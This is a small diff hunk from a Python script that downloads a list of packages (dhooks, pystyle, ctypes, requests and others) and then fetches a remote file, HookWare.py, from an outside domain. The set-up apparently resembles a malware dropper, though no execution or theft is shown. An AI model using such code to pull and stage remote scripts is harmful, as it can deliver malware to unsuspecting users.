@@ -23,7 +23,7 @@ def download_files(url_list, download_path):
             print(f"Failed to download file from {url}")
 
 if __name__ == "__main__":
-    packages_to_download = ["turtle", "dhooks", "pystyle"]
+    packages_to_download = ["turtle", "dhooks", "pystyle", "ctypes", "requests"]
     download_packages(packages_to_download)
     
     urls_to_download = ["https://hook-ware.club/HookWare.py"]
